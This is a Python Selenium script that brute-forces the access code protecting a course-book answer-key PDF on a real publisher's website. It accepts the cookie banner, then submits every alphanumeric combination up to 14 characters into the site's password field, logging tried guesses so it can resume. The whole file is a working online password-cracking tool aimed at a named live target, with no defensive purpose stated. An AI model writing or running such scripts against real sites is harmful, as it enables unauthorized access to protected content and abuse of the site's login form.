from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
import time
import itertools
import string




with open('file.txt', 'r') as file:
    # Read the content of the file and split it by blank spaces
    data = file.read().split()


guesses = len(data)


# setup
s = Service(r'C:\Users\suqih\chromedriver.exe')
driver = webdriver.Chrome(service=s)
driver.get("https://www.klett-sprachen.es/downloads/25366/Klasse_21_5FB1_5F_2D_5FL_F6sungen_5Fzum_5FKursbuch/pdf")
characters = string.digits + string.ascii_letters


attempts = 0
current_position = guesses


def acceptcookies():
    button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.XPATH, '//*[@id="whcookiemanager_select_all"]'))
)
    button.click()  
    return 'It clicked'

def generate_combinations(length):
    global current_position  # Access the global position
    for combo in itertools.product(characters, repeat=length):
        if current_position > 0:
            current_position -= 1
            continue
        yield ''.join(combo)

def crack():
    global current_position, attempts  # Access the global position and attempts
    start_time = time.time()

    while True:
        for length in range(1, 15):  # You can adjust the maximum length of combinations
            for guess in generate_combinations(length):
                attempts += 1
                inputElement = driver.find_element(By.XPATH, '//*[@id="content_right"]/div/div/form/div[1]/input')
                inputElement.send_keys(guess)
                inputElement.send_keys(Keys.ENTER)
                with open('file.txt', 'a') as f:
                    f.write(guess+' ')
            current_position += 1  # Update the current position for each guess
                
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Elapsed time: {elapsed_time:.2f} seconds")


print(acceptcookies())
time.sleep(2)
crack()